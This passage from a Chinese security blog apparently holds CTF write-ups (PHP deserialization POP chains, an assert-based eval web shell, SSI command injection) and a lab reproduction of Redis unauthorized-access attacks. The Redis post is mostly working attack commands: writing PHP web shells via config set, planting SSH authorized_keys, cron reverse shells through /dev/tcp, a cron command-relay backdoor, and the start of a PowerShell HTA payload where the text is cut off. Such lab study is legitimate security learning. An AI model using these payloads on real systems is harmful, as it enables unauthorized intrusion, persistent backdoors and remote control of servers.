Modifier&#123;</span><br><span class="line">protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str=new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hack=new Show();</span><br><span class="line">$hack-&gt;source=new Show();</span><br><span class="line">$hack-&gt;source-&gt;str-&gt;p=new Modifier();</span><br><span class="line">echo urlencode(serialize($hack));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后要使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</p></blockquote><p><img src="C:/Users/1/Desktop/image-20210908203632749.png" alt="image-20210908203632749"></p><p>参考</p><blockquote><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">https://blog.csdn.net/weixin_43952190/article/details/106016260</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/e40b94f24361">https://www.jianshu.com/p/e40b94f24361</a></p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/109877324">https://blog.csdn.net/weixin_45785288/article/details/109877324</a></p></blockquote><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>考点  反序列化  </p><p>打开扫目录啥也没有  源码中发现php   发现反序列化函数 和魔法函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>简单审计后发现  可以通过<code>__destruct函数中的 echo $b($a);</code>进行利用  </p><p>具体使用assert函数 函数会将字符串当做代码执行 利用此可以传马</p><p>即给B传参为assert  a传参为一句话</p><p>exp为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = new HelloPhp();</span><br><span class="line">$test-&gt;b = &#x27;assert&#x27;;</span><br><span class="line">$test-&gt;a = &#x27;eval($_POST[mbg]);&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($test));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行后</p><p><img src="image-20210910201645407.png" alt="image-20210910201645407"></p><p>在  phpinfo中找到</p><p><img src="image-20210910202110284.png" alt="image-20210910202110284"></p><p><img src="image-20210910202139791.png" alt="image-20210910202139791"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫到index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要找 开头是<code>6d0bc1</code>的密文就能登录了  用刚学的三脚猫python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1000000000):</span><br><span class="line">    a = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"></span><br><span class="line">    if a[0:6] == &#x27;6d0bc1&#x27;:</span><br><span class="line">        print(i)</span><br><span class="line">        print(a)</span><br></pre></td></tr></table></figure><p><img src="image-20210910203647633.png" alt="image-20210910203647633"></p><p>找一个顺眼的登上去  </p><p>抓包发现<img src="image-20210910204033587.png" alt="image-20210910204033587"></p><p>访问</p><p><img src="image-20210910204242243.png" alt="image-20210910204242243"></p><p><img src="image-20210910204327451.png" alt="image-20210910204327451"></p><p>经过查阅资料和大佬的wp</p><p>，<code>shtml</code>文件表示服务器当前开启了<strong>SSI</strong>与<strong>CGI</strong>支持，可以使用<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>语法执行命令，<a href="https://www.cnblogs.com/yuzly/p/11226439.html">参考资料</a><br>题目中<code>username</code>被写入了<code>shtml</code>文件，所以将其值修改为：<code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code>：</p><p>发包</p><p><img src="image-20210910205303154.png" alt="image-20210910205303154"></p><p>进去看看</p><p><img src="image-20210910205209777.png" alt="image-20210910205209777"></p><p>查看上个目录  之后就是  常规命令执行了</p><p><img src="image-20210910205358081.png" alt="image-20210910205358081"></p><p><img src="image-20210910205453738.png" alt="image-20210910205453738"></p><p><img src="image-20210910205518442.png" alt="image-20210910205518442"></p><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权复现与利用</title>
      <link href="/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h1><p>REmote DIctionary Server(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。。</p><p> Redis 与其他它key - value 缓存产品有以下三个特点：</p><ul><li><p>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</p></li><li><p>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</p></li><li><p>Redis支持数据的备份，即master-slave模式的数据备份。</p><span id="more"></span></li></ul><p>　　Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>漏洞的产生条件有以下两点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 </span><br></pre></td></tr></table></figure><p>漏洞的危害</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure><p><strong>复现过程</strong></p><p>配置 </p><p>攻击端A centos </p><p>靶机B centos</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1）解压安装包：tar xzf redis-2.8.17.tar.gz进入redis目录：cd redis-2.8.17安装：make</span><br><span class="line">2）make结束后，进入src目录：cd src，</span><br><span class="line">将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">3）返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下：</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">4）使用/etc/目录下的reids.conf文件中的配置启动redis服务：</span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">服务启动成功，我们克隆这台虚拟机</span><br><span class="line">一台作为攻击机192.168.43.99</span><br><span class="line">一台作为靶机192.168.43.159</span><br><span class="line">启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了</span><br><span class="line">关闭redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">启动redis-server</span><br></pre></td></tr></table></figure><p>靶机启动redis后可以使用netstat -ntlp 查看是否开启了6379端口</p><p><img src="image-20210818163735678.png" alt="image-20210818163735678"></p><p>一般的话也可以用nmap</p><p><code>nmap -A -p 6379 -script redis-info 192.168.43.159</code></p><p><img src="image-20210818164007034.png" alt="image-20210818164007034"></p><p><code>./redis-cli -h 192.168.43.159</code></p><p>过程中 如果遇到 <code>No route to host</code></p><p><img src="E:/机密文件/hexo/blog/source/_posts/Redis未授权访问漏洞复现与利用/image-20210818163444178.png" alt="image-20210818163444178"></p><p>关闭防火墙<code>systemctl stop firewalld.service</code></p><p>可以<code>iptables -F</code> #删除过滤规则，不建议</p><p>后来发现也可以<code>firewall-cmd --zone=public --add-port=6379/tcp --permanent</code>开启6379端口然后重启</p><p><code>firewall-cmd --reload    </code></p><p>果然是防火墙的问题<br>可是真正的攻击 对方肯定不会关防火墙的<br>这里只是对 redis 未授权进行复现所以不考虑那么多</p><p><img src="image-20210818163530557.png" alt="image-20210818163530557"></p><p><img src="image-20210818163503309.png" alt="image-20210818163503309"></p><p>1)查看敏感信息</p><p><code>192.168.43.159:6379&gt;info</code></p><p><img src="image-20210818164146071.png" alt="image-20210818164146071"></p><p> 2）查看key和对应的值</p><p><code>keys *</code></p><p><img src="image-20210818184823879.png" alt="image-20210818184823879"></p><h1 id="SSH写入一句话木马"><a href="#SSH写入一句话木马" class="headerlink" title="SSH写入一句话木马"></a>SSH写入一句话木马</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，并未登陆验证 </span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限 （我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）</span><br></pre></td></tr></table></figure><p>靶机在 /var/www/html/uploads这个目录下。<br>执行下列命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.5.135</span><br><span class="line">config set dir  /var/www/html/uploads</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp=fopen(&#x27;bmjoker.php&#x27;,&#x27;w&#x27;);</span><br><span class="line">fwrite($fp,&#x27;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#x27;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20210818190426780.png" alt="image-20210818190426780"></p><p>由于我的靶机上没网站，所以这里就贴个别人的图片记录一下</p><p><img src="image-20210818185926772.png" alt="image-20210818185926772"></p><p>低权也可尝试利用phpinfo的信息和默认路径操作</p><h1 id="SSH免密码登录"><a href="#SSH免密码登录" class="headerlink" title="SSH免密码登录"></a>SSH免密码登录</h1><p><code>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</code></p><p>靶机B创建.ssh文件夹</p><p><code>mkdir /root/.ssh</code></p><p>攻击机A</p><p>生成秘钥 密码设置为空</p><p><code>ssh-keygen -t rsa</code></p><p><img src="image-20210818164621282.png" alt="image-20210818164621282"></p><p>方法一：</p><p>进入.ssh目录：cd .ssh/，将生成的公钥保存到key.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>)&gt;key.txt</span><br></pre></td></tr></table></figure><p><img src="image-20210818164748446.png" alt="image-20210818164748446"></p><p>将key.txt写入redis（使用redis-cli -h ip命令连接主机A，将文件写入）</p><p><code>cat key.txt |redis-cli -h 192.168.43.159 -x set crack</code></p><p><img src="image-20210818165147458.png" alt="image-20210818165147458"></p><p>远程登录主机A的redis服务：redis-cli -h 192.168.0.146 并使用CONFIG GET dir命令得到redis备份的路径</p><p><code>config get dir</code></p><p>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）</p><p><code>config set dir /root/.ssh</code></p><p>设置上传公钥的备份文件名字为authorized_keys</p><p><code>onfig set dbfilename authorized_keys</code></p><p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出，至此成功写入ssh公钥到靶机</p><p><code>config get dbfilename</code></p><p>可以在 靶机B /root/.ssh 目录下查看 authorized_keys</p><p><img src="image-20210818165320501.png" alt="image-20210818165320501"></p><p>方法二：</p><p>生成公钥私钥<br>  <code>ssh-keygen -t rsa</code><br>  一路回车</p><p>攻击机操作靶机Redis</p><p>指定目录<br><code>config set dir /root/.ssh</code><br>指定文件名<br><code>config set dbfilename authorized_keys</code><br>设置公钥内容<br><code>set x &quot;\n\n\nssh-rsaaAAAAB3NzaC1yc2EAAAADAQABAAABAQDET52Uo7NcYs0eSlt0MHrvxBUVVcN52Lr22MRwQdEu4gbqLEKn717BreUu2Vj+4x9Rsveip4aWMxddwbQgrHu7ILVqQSekkn8iUCNpq+oMAjZDnfOhkfLWZZKbrs/stb9FJ/uyOy0vXb9A5xIGdSBS8lBO0xiJc/EohNAr6eyF/U652Ir3yLvnFBWAQwg5ptoYY4JOsy8VcTbYvEV4IIFnPVMVF+IXitLczsVhCEVcNS3yl4dt6wbmRJwE+yVUMyUcFTSInOhkDCAoDsf4E6Cmbrme4yciUdVSHJrRtx8f216Ww4BL325oARE7OS0oefGQbQd6VSGa3Sdm4sYBdwoH 1@localhost.localdomain\n\n\n&quot;</code><br>保存</p><p><code>save</code></p><p>开启 ssh 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure><p><code>ssh -i id_rsa 192.168.43.159</code></p><p>ssh 未授权登录成功</p><p>方法一的</p><p><img src="image-20210818184700453.png" alt="image-20210818184700453"></p><p>方法二的</p><p><img src="image-20210818173430077.png" alt="image-20210818173430077"></p><p><img src="image-20210818174116364.png" alt="image-20210818174116364"></p><p>看到确实ip是靶机的，</p><h1 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h1><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p><p>攻击端监听一个端口</p><p>nc -lvnp 4444</p><p>连接redis，写入反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.43.159 set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.43.159/4444 0&gt;&amp;1\n\n&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron </span><br><span class="line"></span><br><span class="line">config set dbfilename root </span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>过一分钟左右就可以收到shell</p><p>利用crontab反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/114.114.114.114/53 0&gt;&amp;1nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br></pre></td></tr></table></figure><p>利用crontab创建文件 /tmp/888</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall # 为了方便测试 </span><br><span class="line">redis-cli set test &#x27;test&#x27; </span><br><span class="line">redis-cli set my &#x27;mymymymymymymymymymymymy&#x27; </span><br><span class="line">redis-cli set word &#x27;wordwordwordwordwordword&#x27; </span><br><span class="line">redis-cli set hello &#x27;ringzero&#x27; </span><br><span class="line">redis-cli set word1 &#x27;word1word1word1word1word1word1&#x27; </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/touch /tmp/888nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br><span class="line">redis-cli flushall </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/touch /tmp/888nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br></pre></td></tr></table></figure><p>二次改写crontab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall </span><br><span class="line">redis-cli set 2 &#x27;;a=`redis-cli get c`;&#x27; </span><br><span class="line">redis-cli set 1 &#x27;id;redis-cli set r `$a`;#&#x27; </span><br><span class="line">redis-cli config set dir /tmp/ </span><br><span class="line">redis-cli config set dbfilename w </span><br><span class="line">redis-cli save </span><br><span class="line">redis-cli set c whoami</span><br></pre></td></tr></table></figure><p>利用第一步的写crontab步骤，完成下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot; &quot; &gt; /tmp/zz </span><br><span class="line">cat /tmp/w &gt;&gt; /tmp/zz </span><br><span class="line">/bin/sh /tmp/zz </span><br><span class="line">redis-cli get r</span><br></pre></td></tr></table></figure><p>控制 /var/spool/cron/root 和 /tmp/zz</p><p> 最终实现，每10秒从redis的c变量读入要执行的命令，再将执行结果写入变量r</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * sleep 10;/bin/sh /tmp/zz</span><br></pre></td></tr></table></figure><p>windows利用方式（转自90sec）</p><p><strong>redis</strong> 官方未发布windows版本，但是野外存在redis/win版本。</p><p>在测试时发现一windows版本redis，遂开始搞。</p><p>直接上利用，基于msf:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@weisuo.org:~# cat hta-psh.txt </span><br><span class="line"> &lt;scRipt language=&quot;VBscRipT&quot;&gt;CreateObject(&quot;WscrIpt.SheLL&quot;).Run &quot;powershell -w hidden IEX (New-ObjEct 